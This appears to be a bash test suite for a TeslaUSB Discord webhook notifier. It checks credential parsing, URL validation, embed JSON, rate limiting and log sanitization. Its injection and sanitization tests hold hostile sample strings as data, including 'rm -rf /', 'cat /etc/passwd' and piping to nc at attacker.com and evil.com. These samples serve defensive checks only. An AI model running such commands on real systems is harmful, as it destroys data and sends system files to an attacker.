#!/bin/bash
# Test suite for send-discord notification script
# Tests credential parsing, rate limiting, and embed generation

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SEND_DISCORD="$SCRIPT_DIR/../run/send-discord"
TEST_LOG="/tmp/test_discord.log"
FAILED=0
PASSED=0

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

function log() {
  echo -e "${YELLOW}[TEST]${NC} $1"
}

function pass() {
  echo -e "${GREEN}[PASS]${NC} $1"
  PASSED=$((PASSED + 1))
}

function fail() {
  echo -e "${RED}[FAIL]${NC} $1"
  FAILED=$((FAILED + 1))
}

# Setup test environment
function setup() {
  export LOG_FILE="$TEST_LOG"
  > "$TEST_LOG"
  rm -f /tmp/discord_rate_limit
  rm -f /tmp/discord_rate_limit_reset
}

# Test 1: Credential file not found
test_no_credentials() {
  log "Test 1: No credentials file"
  setup
  
  # Create a modified version that uses temp credential path
  local test_script
  test_script=$(mktemp /tmp/test_send_discord.XXXXXX)
  sed "s|CRED_FILE=\"/root/.teslaCamDiscordCredentials\"|CRED_FILE=\"/tmp/nonexistent_creds_$$\"|" "$SEND_DISCORD" > "$test_script"
  chmod +x "$test_script"
  
  # Should exit gracefully (exit 0) when no credentials
  if bash "$test_script" 5 0 2>/dev/null; then
    pass "Exits gracefully when no credentials"
  else
    fail "Should exit gracefully (code 0) when no credentials"
  fi
  
  rm -f "$test_script"
}

# Test 2: Safe credential parsing - valid webhook
test_valid_credentials() {
  log "Test 2: Valid credential parsing"
  setup
  
  # Create test credentials
  cat > /tmp/test_discord_creds << 'EOF'
export discord_webhook_url="https://discord.com/api/webhooks/123456789/abcdefghijklmnopqrstuvwxyz"
export discord_username="TestBot"
export discord_avatar_url="https://example.com/avatar.png"
EOF
  
  # Extract and validate
  url=$(grep "^export discord_webhook_url=" /tmp/test_discord_creds | sed 's/^export discord_webhook_url=//; s/^[\\'"'"'""]//; s/[\\'"'"'""]$//')
  
  if [[ "$url" == "https://discord.com/api/webhooks/123456789/abcdefghijklmnopqrstuvwxyz" ]]; then
    pass "Valid webhook URL parsed correctly"
  else
    fail "Failed to parse webhook URL correctly: $url"
  fi
}

# Test 3: Injection prevention in webhook URL
test_injection_prevention() {
  log "Test 3: Injection prevention"
  setup
  
  # Test various injection patterns
  local malicious_urls=(
    'https://discord.com/api/webhooks/123/$(cat /etc/passwd)'
    'https://discord.com/api/webhooks/123/token; rm -rf /'
    'https://discord.com/api/webhooks/123/token|nc attacker.com 1337'
    'https://discord.com/api/webhooks/123/token`whoami`'
    'https://discord.com/api/webhooks/123/token$(echo pwned)'
  )
  
  local injection_detected=0
  for url in "${malicious_urls[@]}"; do
    if [[ "$url" =~ [\$\;\|\&\<\>\`\(\)\{\}] ]]; then
      injection_detected=$((injection_detected + 1))
    fi
  done
  
  if [ "$injection_detected" -eq "${#malicious_urls[@]}" ]; then
    pass "All injection patterns detected"
  else
    fail "Not all injection patterns detected ($injection_detected/${#malicious_urls[@]})"
  fi
}

# Test 4: Webhook URL validation
test_url_validation() {
  log "Test 4: Webhook URL format validation"
  setup
  
  # Valid URLs
  local valid_urls=(
    "https://discord.com/api/webhooks/123456/abc123"
    "https://discord.com/api/webhooks/123456789/abcdefghijklmnopqrstuvwxyz"
    "https://discord.com/api/webhooks/123456789/ABC-DEF_123"
  )
  
  # Invalid URLs
  local invalid_urls=(
    "http://discord.com/api/webhooks/123/abc"  # http instead of https
    "https://discord.com/api/webhook/123/abc"   # webhook singular
    "https://discord.com/api/webhooks/123"      # missing token
    "https://evil.com/api/webhooks/123/abc"     # wrong domain
    "https://discord.com/api/webhooks/abc/123"  # ID not numeric
  )
  
  local valid_passed=0
  local invalid_rejected=0
  
  for url in "${valid_urls[@]}"; do
    if [[ "$url" =~ ^https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+$ ]]; then
      valid_passed=$((valid_passed + 1))
    fi
  done
  
  for url in "${invalid_urls[@]}"; do
    if [[ ! "$url" =~ ^https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+$ ]]; then
      invalid_rejected=$((invalid_rejected + 1))
    fi
  done
  
  if [ "$valid_passed" -eq "${#valid_urls[@]}" ] && [ "$invalid_rejected" -eq "${#invalid_urls[@]}" ]; then
    pass "URL validation working correctly ($valid_passed valid, $invalid_rejected rejected)"
  else
    fail "URL validation issues (valid: $valid_passed/${#valid_urls[@]}, rejected: $invalid_rejected/${#invalid_urls[@]})"
  fi
}

# Test 5: Embed JSON generation
test_embed_generation() {
  log "Test 5: Discord embed JSON structure"
  setup
  
  # Test embed building logic
  local files_moved=5
  local files_failed=1
  local timestamp
  timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.000Z")
  
  # Build test embed
  local embed_json
  embed_json=$(cat <<EOF
{
  "username": "TeslaUSB",
  "avatar_url": "https://raw.githubusercontent.com/marcone/teslausb/main/teslausb-logo.png",
  "embeds": [{
    "title": "🚗 TeslaUSB - Archivierung abgeschlossen",
    "description": "📹 **$files_moved** Dashcam-Datei(en) archiviert\n⚠️ **$files_failed** Datei(en) fehlgeschlagen",
    "color": 16776960,
    "timestamp": "$timestamp",
    "footer": {
      "text": "TeslaUSB • test-host"
    },
    "fields": []
  }]
}
EOF
)
  
  # Validate JSON structure
  if echo "$embed_json" | python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null; then
    pass "Embed JSON is valid"
  else
    fail "Embed JSON is invalid"
  fi
  
  # Check required fields
  if echo "$embed_json" | grep -q '"username":' && \
     echo "$embed_json" | grep -q '"embeds":' && \
     echo "$embed_json" | grep -q '"title":'; then
    pass "Embed contains required fields"
  else
    fail "Embed missing required fields"
  fi
}

# Test 6: Rate limiting logic
test_rate_limiting() {
  log "Test 6: Rate limiting"
  setup
  
  # Test local rate limit tracking
  local now
  now=$(date +%s)
  echo "$now" > /tmp/discord_rate_limit
  
  # Check if rate limit file exists and is recent
  if [ -f /tmp/discord_rate_limit ]; then
    local last_sent
    last_sent=$(cat /tmp/discord_rate_limit)
    local elapsed=$((now - last_sent))
    if [ "$elapsed" -lt 2 ]; then
      pass "Rate limit tracking working"
    else
      fail "Rate limit calculation incorrect"
    fi
  else
    fail "Rate limit file not created"
  fi
}

# Test 7: Color selection based on status
test_color_selection() {
  log "Test 7: Embed color selection"
  setup
  
  # Success (all moved, no failures): 3066993 (green)
  # Warning (some failures): 16776960 (yellow)
  # Error (all failed): 15158332 (red)
  
  local color_success=3066993
  local color_warning=16776960
  local color_error=15158332
  
  # Test cases
  local test_cases=(
    "5:0:$color_success"
    "10:0:$color_success"
    "5:1:$color_warning"
    "10:2:$color_warning"
    "0:5:$color_error"
    "0:1:$color_error"
  )
  
  local passed=0
  for tc in "${test_cases[@]}"; do
    IFS=':' read -r moved failed expected <<< "$tc"
    
    local color
    if [ "$failed" -gt 0 ]; then
      if [ "$moved" -eq 0 ]; then
        color=$color_error
      else
        color=$color_warning
      fi
    else
      color=$color_success
    fi
    
    if [ "$color" -eq "$expected" ]; then
      passed=$((passed + 1))
    fi
  done
  
  if [ "$passed" -eq "${#test_cases[@]}" ]; then
    pass "Color selection logic correct ($passed/${#test_cases[@]})"
  else
    fail "Color selection issues ($passed/${#test_cases[@]})"
  fi
}

# Test 8: Log sanitization
test_log_sanitization() {
  log "Test 8: Log sanitization"
  setup
  
  # Test log message sanitization
  local malicious_msg='Test; rm -rf / | nc evil.com'
  local sanitized
  sanitized=$(printf '%s' "$malicious_msg" | tr -d '\r\n\000-\031\177' | sed 's/\\e\[[0-9;]*m//g')
  
  # Should still contain text but no newlines/control chars
  if [[ "$sanitized" == *"Test"* ]] && [[ "$sanitized" != *$'\n'* ]]; then
    pass "Log sanitization working"
  else
    fail "Log sanitization not working correctly"
  fi
}

# Main test execution
main() {
  echo "========================================"
  echo "Discord Notification Test Suite"
  echo "========================================"
  echo ""
  
  # Check if send-discord script exists
  if [ ! -f "$SEND_DISCORD" ]; then
    echo -e "${RED}[ERROR]${NC} send-discord script not found at $SEND_DISCORD"
    exit 1
  fi
  
  # Run all tests
  test_no_credentials
  test_valid_credentials
  test_injection_prevention
  test_url_validation
  test_embed_generation
  test_rate_limiting
  test_color_selection
  test_log_sanitization
  
  # Summary
  echo ""
  echo "========================================"
  echo "Test Results: $PASSED passed, $FAILED failed"
  echo "========================================"
  
  # Cleanup
  rm -f /tmp/test_discord_creds
  rm -f "$TEST_LOG"
  
  if [ "$FAILED" -eq 0 ]; then
    echo -e "${GREEN}All tests passed!${NC}"
    exit 0
  else
    echo -e "${RED}Some tests failed!${NC}"
    exit 1
  fi
}

main "$@"
